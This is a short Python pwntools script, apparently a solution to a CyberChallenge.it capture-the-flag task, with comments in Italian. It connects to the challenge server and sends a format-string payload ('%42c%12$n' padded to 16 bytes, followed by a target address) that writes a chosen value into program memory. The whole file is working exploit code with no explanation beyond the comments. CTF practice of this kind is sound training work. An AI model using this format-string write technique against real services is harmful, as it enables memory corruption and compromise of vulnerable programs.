from pwn import *

r = remote('answer.challs.cyberchallenge.it', 9122)

answer_addr = 0x601078

# Slot 10 + Slot 11 devono essere esattamente 16 byte (8+8) cosi l indirizzo finoisce esatutamemnte all inizio di slot 12 
formato = b"%42c%12$n" 
payload = formato.ljust(16, b"A") # Riempie fino a 16 byte con 'A'
payload += p64(answer_addr)      # L'indirizzo ora è perfettamente allineato allo slot 12

log.info(f"Sending payload: {payload}")
r.sendline(payload)

#leggo quello che ce li 
print(r.recvall(timeout=2))



